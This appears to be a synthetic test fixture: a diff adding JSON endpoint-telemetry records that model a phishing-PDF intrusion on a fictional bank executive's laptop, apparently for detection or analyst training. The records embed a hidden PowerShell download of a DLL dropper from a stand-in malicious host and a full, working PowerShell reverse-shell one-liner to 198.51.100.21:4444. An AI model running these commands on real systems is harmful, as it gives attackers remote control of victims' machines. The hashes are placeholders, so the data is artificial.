@@ -1,0 +1,259 @@
+[
+{
+  "Timestamp": "2025-12-06T09:05:09Z",
+  "DeviceId": "WIN11-LAPTOP-CEODEV-5566",
+  "DeviceName": "ceo-laptop01.grandbank.corp",
+  "ActionType": "ProcessCreated",
+
+  "FileName": "cmd.exe",
+  "FolderPath": "C:\\Windows\\System32\\cmd.exe",
+
+  "SHA1": "9a7d5f1b8d21431e81e888e98a037ef1293c5db4",
+  "SHA256": "",
+  "MD5": "3b4f8c21edab51ff72d2655fdde53312",
+  "FileSize": 289792,
+
+  "ProcessVersionInfoCompanyName": "Microsoft Corporation",
+  "ProcessVersionInfoProductName": "Microsoft® Windows® Operating System",
+  "ProcessVersionInfoProductVersion": "10.0.22631.2428",
+  "ProcessVersionInfoInternalFileName": "cmd",
+  "ProcessVersionInfoOriginalFileName": "Cmd.Exe",
+  "ProcessVersionInfoFileDescription": "Windows Command Processor",
+
+  "ProcessId": 6540,
+  "ProcessCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c powershell -nop -w hidden -c Invoke-WebRequest https://malicious-update-storage.eastus.cloudapp[.]azure.com/dropper.dll -OutFile C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll",
+  "ProcessIntegrityLevel": "Medium",
+  "ProcessTokenElevation": "TokenElevationTypeLimited",
+  "ProcessCreationTime": "2025-12-06T09:05:09Z",
+
+  "AccountDomain": "GRANDBANK",
+  "AccountName": "richard.sterling",
+  "AccountSid": "user-sid-12345",
+  "AccountUpn": "richard.sterling@grandbank.corp",
+  "AccountObjectId": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
+  "LogonId": 113245,
+
+  "InitiatingProcessAccountDomain": "GRANDBANK",
+  "InitiatingProcessAccountName": "richard.sterling",
+  "InitiatingProcessAccountSid": "user-sid-12345",
+  "InitiatingProcessAccountUpn": "richard.sterling@grandbank.corp",
+  "InitiatingProcessAccountObjectId": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
+  "InitiatingProcessLogonId": 113245,
+  "InitiatingProcessIntegrityLevel": "Medium",
+  "InitiatingProcessTokenElevation": "TokenElevationTypeLimited",
+
+  "InitiatingProcessSHA1": "846e152aaf4821dab53c1a24cd683115ee9bb98a",
+  "InitiatingProcessSHA256": "",
+  "InitiatingProcessMD5": "f2a12ebc66a143119d82dca771e2f07b",
+
+  "InitiatingProcessFileName": "AcroRd32.exe",
+  "InitiatingProcessFileSize": 34567840,
+  "InitiatingProcessVersionInfoCompanyName": "Adobe Systems Incorporated",
+  "InitiatingProcessVersionInfoProductName": "Adobe Acrobat Reader",
+  "InitiatingProcessVersionInfoProductVersion": "23.005.20458",
+  "InitiatingProcessVersionInfoInternalFileName": "AcroRd32",
+  "InitiatingProcessVersionInfoOriginalFileName": "AcroRd32.exe",
+  "InitiatingProcessVersionInfoFileDescription": "Adobe Acrobat Reader",
+
+  "InitiatingProcessId": 5920,
+  "InitiatingProcessCommandLine": "\"C:\\Program Files\\Adobe\\Acrobat Reader\\AcroRd32.exe\" \"C:\\Users\\Richard\\Downloads\\Q3_Financials_Review.pdf\"",
+  "InitiatingProcessCreationTime": "2025-12-06T09:04:00Z",
+  "InitiatingProcessFolderPath": "C:\\Program Files\\Adobe\\Acrobat Reader\\",
+
+  "InitiatingProcessParentId": 4210,
+  "InitiatingProcessParentFileName": "explorer.exe",
+  "InitiatingProcessParentCreationTime": "2025-12-06T09:03:59Z",
+
+  "InitiatingProcessSignerType": "Signed",
+  "InitiatingProcessSignatureStatus": "Valid",
+
+  "ReportId": 894455,
+  "AppGuardContainerId": "",
+  "AdditionalFields": "[{\"NetworkMessageId\": \"source-record-id-5555\"}, {\"AttachmentSHA256\": \"4d7f0c33e84bd7d1f7bbd65fa32a9c53bd627b51e29237b83d8c87910d22f5c6\"}]",
+
+  "InitiatingProcessSessionId": 2,
+  "IsInitiatingProcessRemoteSession": false,
+  "InitiatingProcessRemoteSessionDeviceName": "",
+  "InitiatingProcessRemoteSessionIP": "",
+
+  "CreatedProcessSessionId": 2,
+  "IsProcessRemoteSession": false,
+  "ProcessRemoteSessionDeviceName": "",
+  "ProcessRemoteSessionIP": "",
+
+  "ProcessUniqueId": "6540-2025-12-06T09:05:09Z",
+  "InitiatingProcessUniqueId": "5920-2025-12-06T09:04:00ZZ"
+}
+,
+{
+  "Timestamp": "2025-12-06T09:06:12Z",
+  "DeviceId": "WIN11-LAPTOP-CEODEV-5566",
+  "DeviceName": "ceo-laptop01.grandbank.corp",
+  "ActionType": "ProcessCreated",
+
+  "FileName": "rundll32.exe",
+  "FolderPath": "C:\\Windows\\System32\\rundll32.exe",
+
+  "SHA1": "d41d8cd98f00b204e9800998ecf8427e",
+  "SHA256": "",
+  "MD5": "098f6bcd4621d373cade4e832627b4f6",
+  "FileSize": 45568,
+
+  "ProcessVersionInfoCompanyName": "Microsoft Corporation",
+  "ProcessVersionInfoProductName": "Microsoft® Windows® Operating System",
+  "ProcessVersionInfoProductVersion": "10.0.22631.2428",
+  "ProcessVersionInfoInternalFileName": "rundll32",
+  "ProcessVersionInfoOriginalFileName": "RUNDLL32.EXE",
+  "ProcessVersionInfoFileDescription": "Windows Host Process (Rundll32)",
+
+  "ProcessId": 6684,
+  "ProcessCommandLine": "rundll32.exe \"C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll\",EntryPoint",
+  "ProcessIntegrityLevel": "Medium",
+  "ProcessTokenElevation": "TokenElevationTypeLimited",
+  "ProcessCreationTime": "2025-12-06T09:06:12Z",
+
+  "AccountDomain": "GRANDBANK",
+  "AccountName": "richard.sterling",
+  "AccountSid": "user-sid-12345",
+  "AccountUpn": "richard.sterling@grandbank.corp",
+  "AccountObjectId": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
+  "LogonId": 113245,
+
+  "InitiatingProcessAccountDomain": "GRANDBANK",
+  "InitiatingProcessAccountName": "richard.sterling",
+  "InitiatingProcessAccountSid": "user-sid-12345",
+  "InitiatingProcessAccountUpn": "richard.sterling@grandbank.corp",
+  "InitiatingProcessAccountObjectId": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
+  "InitiatingProcessLogonId": 113245,
+  "InitiatingProcessIntegrityLevel": "Medium",
+  "InitiatingProcessTokenElevation": "TokenElevationTypeLimited",
+
+  "InitiatingProcessSHA1": "9a7d5f1b8d21431e81e888e98a037ef1293c5db4",
+  "InitiatingProcessSHA256": "",
+  "InitiatingProcessMD5": "3b4f8c21edab51ff72d2655fdde53312",
+
+  "InitiatingProcessFileName": "cmd.exe",
+  "InitiatingProcessFileSize": 289792,
+  "InitiatingProcessVersionInfoCompanyName": "Microsoft Corporation",
+  "InitiatingProcessVersionInfoProductName": "Microsoft® Windows® Operating System",
+  "InitiatingProcessVersionInfoProductVersion": "10.0.22631.2428",
+  "InitiatingProcessVersionInfoInternalFileName": "cmd",
+  "InitiatingProcessVersionInfoOriginalFileName": "Cmd.Exe",
+  "InitiatingProcessVersionInfoFileDescription": "Windows Command Processor",
+
+  "InitiatingProcessId": 6540,
+  "InitiatingProcessCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c powershell -nop -w hidden -c Invoke-WebRequest https://malicious-update-storage.eastus.cloudapp[.]azure.com/dropper.dll -OutFile C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll",
+  "InitiatingProcessCreationTime": "2025-12-06T09:05:09Z",
+  "InitiatingProcessFolderPath": "C:\\Windows\\System32\\",
+
+  "InitiatingProcessParentId": 5920,
+  "InitiatingProcessParentFileName": "AcroRd32.exe",
+  "InitiatingProcessParentCreationTime": "2025-12-06T09:04:00Z",
+
+  "InitiatingProcessSignerType": "Signed",
+  "InitiatingProcessSignatureStatus": "Valid",
+
+  "ReportId": 894455,
+  "AppGuardContainerId": "",
+  "AdditionalFields": "[{\"NetworkMessageId\": \"source-record-id-5555\"}, {\"AttachmentSHA256\": \"4d7f0c33e84bd7d1f7bbd65fa32a9c53bd627b51e29237b83d8c87910d22f5c6\"}]",
+
+  "InitiatingProcessSessionId": 2,
+  "IsInitiatingProcessRemoteSession": false,
+  "InitiatingProcessRemoteSessionDeviceName": "",
+  "InitiatingProcessRemoteSessionIP": "",
+
+  "CreatedProcessSessionId": 2,
+  "IsProcessRemoteSession": false,
+  "ProcessRemoteSessionDeviceName": "",
+  "ProcessRemoteSessionIP": "",
+
+  "ProcessUniqueId": "6684-2025-12-06T09:06:12Z",
+  "InitiatingProcessUniqueId": "6540-2025-12-06T09:05:09Z"
+}
+,
+{
+  "Timestamp": "2025-12-06T09:06:16Z",
+  "DeviceId": "WIN11-LAPTOP-CEODEV-5566",
+  "DeviceName": "ceo-laptop01.grandbank.corp",
+  "ActionType": "ProcessCreated",
+
+  "FileName": "powershell.exe",
+  "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+
+  "SHA1": "fc1a6b52a2040d0fb8ba71b4b3c8d97f15cfe621",
+  "SHA256": "",
+  "MD5": "0cc175b9c0f1b6a831c399e269772661",
+  "FileSize": 463872,
+
+  "ProcessVersionInfoCompanyName": "Microsoft Corporation",
+  "ProcessVersionInfoProductName": "Microsoft® Windows® Operating System",
+  "ProcessVersionInfoProductVersion": "10.0.22631.2428",
+  "ProcessVersionInfoInternalFileName": "powershell",
+  "ProcessVersionInfoOriginalFileName": "PowerShell.EXE",
+  "ProcessVersionInfoFileDescription": "Windows PowerShell",
+
+  "ProcessId": 7744,
+  "ProcessCommandLine": "powershell.exe -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('198.51.100.21',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\"",
+  "ProcessCreationTime": "2025-12-06T09:06:16Z",
+  "ProcessIntegrityLevel": "Medium",
+  "ProcessTokenElevation": "TokenElevationTypeLimited",
+
+  "CreatedProcessSessionId": 2,
+  "IsProcessRemoteSession": false,
+  "ProcessRemoteSessionDeviceName": "",
+  "ProcessRemoteSessionIP": "",
+
+  "AccountDomain": "GRANDBANK",
+  "AccountName": "richard.sterling",
+  "AccountSid": "user-sid-12345",
+  "AccountUpn": "richard.sterling@grandbank.corp",
+  "AccountObjectId": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
+  "LogonId": 113245,
+
+  "InitiatingProcessAccountDomain": "GRANDBANK",
+  "InitiatingProcessAccountName": "richard.sterling",
+  "InitiatingProcessAccountSid": "user-sid-12345",
+  "InitiatingProcessAccountUpn": "richard.sterling@grandbank.corp",
+  "InitiatingProcessAccountObjectId": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
+  "InitiatingProcessLogonId": 113245,
+  "InitiatingProcessIntegrityLevel": "Medium",
+  "InitiatingProcessTokenElevation": "TokenElevationTypeLimited",
+
+  "InitiatingProcessSHA1": "d41d8cd98f00b204e9800998ecf8427e",
+  "InitiatingProcessSHA256": "",
+  "InitiatingProcessMD5": "098f6bcd4621d373cade4e832627b4f6",
+
+  "InitiatingProcessFileName": "rundll32.exe",
+  "InitiatingProcessFileSize": 45568,
+  "InitiatingProcessVersionInfoCompanyName": "Microsoft Corporation",
+  "InitiatingProcessVersionInfoProductName": "Microsoft® Windows® Operating System",
+  "InitiatingProcessVersionInfoProductVersion": "10.0.22631.2428",
+  "InitiatingProcessVersionInfoInternalFileName": "rundll32",
+  "InitiatingProcessVersionInfoOriginalFileName": "RUNDLL32.EXE",
+  "InitiatingProcessVersionInfoFileDescription": "Windows Host Process (Rundll32)",
+
+  "InitiatingProcessId": 6684,
+  "InitiatingProcessCommandLine": "rundll32.exe \"C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll\",EntryPoint",
+  "InitiatingProcessCreationTime": "2025-12-06T09:06:12Z",
+  "InitiatingProcessFolderPath": "C:\\Windows\\System32\\",
+
+  "InitiatingProcessParentId": 6540,
+  "InitiatingProcessParentFileName": "cmd.exe",
+  "InitiatingProcessParentCreationTime": "2025-12-06T09:05:09Z",
+
+  "InitiatingProcessSignerType": "Signed",
+  "InitiatingProcessSignatureStatus": "Valid",
+
+  "ReportId": 894455,
+  "AppGuardContainerId": "",
+  "AdditionalFields": "[{\"NetworkMessageId\": \"source-record-id-5555\"}, {\"AttachmentSHA256\": \"4d7f0c33e84bd7d1f7bbd65fa32a9c53bd627b51e29237b83d8c87910d22f5c6\"}]",
+
+  "InitiatingProcessSessionId": 2,
+  "IsInitiatingProcessRemoteSession": false,
+  "InitiatingProcessRemoteSessionDeviceName": "",
+  "InitiatingProcessRemoteSessionIP": "",
+
+  "ProcessUniqueId": "7744-2025-12-06T09:06:16Z",
+  "InitiatingProcessUniqueId": "6684-2025-12-06T09:06:12Z"
+}  
+]
